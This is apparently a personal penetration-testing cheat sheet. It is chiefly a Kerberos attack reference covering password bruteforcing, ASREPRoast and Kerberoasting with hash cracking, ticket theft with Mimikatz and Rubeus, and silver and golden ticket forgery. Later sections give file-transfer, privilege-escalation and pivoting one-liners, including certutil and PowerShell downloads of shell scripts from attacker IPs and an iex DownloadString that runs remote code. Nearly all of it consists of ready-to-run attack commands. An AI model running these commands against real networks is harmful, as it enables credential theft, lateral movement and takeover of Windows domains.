        [here](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Getting-Shells-101)

# Kerberos cheatsheet

## Bruteforcing

With [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):
```shell
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
```shell
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

## ASREPRoast

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.py:
```shell
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

With [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

Cracking with dictionary of passwords:
```shell
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>
```


## Kerberoasting

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.py:
```shell
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```


With [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

With **Powershell**:
```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```

Cracking with dictionary of passwords:
```shell
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```


## Overpass The Hash/Pass The Key (PTK)

By using [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```


With [Rubeus](https://github.com/GhostPack/Rubeus) and [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Pass The Ticket (PTT)

### Harvest tickets from Linux

Check type and location of tickets:

```shell
grep default_ccache_name /etc/krb5.conf
```
If none return, default is FILE:/tmp/krb5cc_%{uid}.

In case of file tickets, you can copy-paste (if you have permissions) for use them.

In case of being *KEYRING* tickets, you can use [tickey](https://github.com/TarlogicSecurity/tickey) to get them:

```shell
# To dump current user tickets, if root, try to dump them all by injecting in other user processes
# to inject, copy tickey in a reachable folder by all users
cp tickey /tmp/tickey
/tmp/tickey -i
```

### Harvest tickets from Windows

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
mimikatz # sekurlsa::tickets /export
```

With [Rubeus](https://github.com/GhostPack/Rubeus) in Powershell:
```shell
.\Rubeus dump

# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
```


To convert tickets between Linux/Windows format with [ticket_converter.py](https://github.com/Zer1t0/ticket_converter):

```
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

### Using ticket in Linux:

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```


### Using ticket in Windows

Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Silver ticket

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# To generate the TGS with NTLM
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# To generate the TGS with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
# To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Golden ticket

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```


With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
# To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Evasion

Reverse ssh firewall port:
-   ssh -L 10001:127.0.0.1:10000 agent47@10.10.184.65
-   openssl passwd -1 -salt [salt] [password]

## GTFO

sudo -u silvio zip $TF /etc/hosts -T -TT 'bash #'

## File transfer

HTTP:

-   wget 10.8.3.22:8000/LinEnum.sh
-   powershell -c "Invoke-WebRequest -Uri 'http://10.11.17.71:80/Message.exe' -OutFile 'C:\windows\temp\Message.exe'"

FTP:

-   pip install pyftpdlib
    python -m pyftpdlib -p 21 -w

-   In reverse shell:
        echo open 10.10.10.10 > ftp.txt
        echo USER anonymous >> ftp.txt
        echo ftp >> ftp.txt 
        echo bin >> ftp.txt
        echo GET "file" >> ftp.txt
        echo bye >> ftp.txt
    ftp -v -n -s:ftp.txt

TFTP:

-   atftpd --daemon --port 69 /tftp
-   In reverse shell
        tftp -i 10.10.10.10 GET nc.exe

SSH:

-   scp user@host:/dir/file ./dir (remote to local)(terminal from local)
-   scp ./localfile user@host:/dir/ (local to remote)

Base64:

-   base64 remotefile.ext
    echo "copied text" file
    base64 -d file > local.ext

Netcat:

-   nc -w 0 -lnvp 1234 < test (remote)
    nc 10.10.241.248 1234 > test (local)

Socat:
    - socat -u FILE:"${HOME}/.vimrc" TCP-LISTEN:5778,reuseaddr (remote)
    - socat -u TCP:192.168.1.97:5778 STDOUT > /path/to/downloaded/file (local)

Powershell/cmd:

-   powershell -c "Invoke-WebRequest 'http://10.9.0.54:8000/launcher.bat' -OutFile 'C:\windows\temp\launcher.bat'"
-   certutil -urlcache -split -f http://10.10.14.7/shell.bat C:\\users\\public\\shell.bat

Impacket SMB:

-   sudo impacket-smbserver shared $(pwd) -smb2support -user user -password password
-   PS:
       $pass= convertto-securestring 'password' -AsPlainText -Force
       $cred= New-Object System.Management.Automation.PSCredential('user', $pass)
       New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\10.10.14.4\shared
       cd user:


-   impacket-smbserver "foldername" `pwd` (local)
    sudo impacket-smbserver share /temp/ -smb2support
-   net use z: \\10.10.14.5\foldername (remote)

VBS:

-   In reverse shell
        echo strUrl = WScript.Arguments.Item(0) > wget.vbs
        echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
        echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
        echo Err.Clear >> wget.vbs
        echo Set http = Nothing >> wget.vbs
        echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
        echo http.Open "GET",strURL,False >> wget.vbs
        echo http.Send >> wget.vbs
        echo varByteArray = http.ResponseBody >> wget.vbs
        echo Set http = Nothing >> wget.vbs
        echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
        echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
        echo strData = "" >> wget.vbs
        echo strBuffer = "" >> wget.vbs
        echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
        echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
        echo Next >> wget.vbs
        echo ts.Close >> wget.vbs
-   Execute
        cscript wget.vbs http://10.10.10.10/file.exe file.exe


## Pivoting

    -Scanning in bash for IPs:
        for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
   
    -Port scanning in bash:
        for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

    -Port scanning in nc:
        nc -zv 192.168.100.1 1-65535

    

## Misc

To get NTLM from password:
```python
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```
Searching:
-   find / 2>>/dev/null | grep -i "flag"

Create a new password for /etc/passwd:
-   openssl passwd -1 -salt [salt] [password]

Open ports:
-   sudo netstat -plntu

Extract files from a file:
- binwalk -e file

Stegano:

-   steghide info TryHackMe.jpg
-   steghide extract -sf TryHackMe.jpg

Creating an image of a partition:
-   sudo dcfldd if=/dev/sda of=/home/pi/usb.dd

Fuzzing:
-   wfuzz -w "wordlist" -d 'Collected Burp loging Request' -c -d 'cookies if available' http://../../..php

Collecting words from webpage cewl:
-   cewl -w file.out 10.10.10.150

Curl read a file:
-   curl file:///etc/passwd

Remote Desktop for windows with share and 85% screen
-   rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10

## Tools

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Rubeus](https://github.com/Zer1t0/Rubeus) with brute module
* [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
* [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
* [tickey](https://github.com/TarlogicSecurity/tickey)
* [ticket_converter.py](https://github.com/Zer1t0/ticket_converter)

